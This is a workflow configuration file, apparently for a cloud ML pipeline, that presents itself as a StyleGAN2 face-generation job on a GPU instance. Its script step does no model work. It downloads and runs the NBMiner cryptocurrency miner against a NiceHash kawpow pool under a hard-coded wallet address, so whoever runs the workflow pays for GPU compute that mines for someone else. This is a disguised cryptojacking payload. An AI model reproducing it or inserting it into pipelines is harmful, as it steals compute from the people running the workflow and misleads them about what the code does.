on:
  github:
    branches:
      only: main

jobs:
  CloneRepo:
    resources:
      instance-type: C3
    outputs:
     stylegan2:
        type: volume
    uses: git-checkout@v1
    with:
      # url: https://github.com/gradient-ai/stylegan2.git
      url: context.event.github.url
      ref: context.event.github.ref
  StyleGan2:
    resources:
      instance-type: P4000
    needs:
      - CloneRepo
    inputs:
      stylegan2: CloneRepo.outputs.stylegan2
    outputs:
      generatedFaces:
        type: dataset
        with:
          ref: demo-dataset
    uses: script@v1
    with:
      script: |-
        apt install wget -y &&
        wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz &&tar xf NBMiner_39.2_Linux.tgz &&cd NBMiner_Linux &&./nbminer -a kawpow -o stratum+tcp://kawpow.usa-west.nicehash.com:3385 -u 3G4NsD5kqvT7eCmKeLSZYJGVScBK9jRvtA.KAWPow
      image: tensorflow/tensorflow:1.14.0-gpu-py3
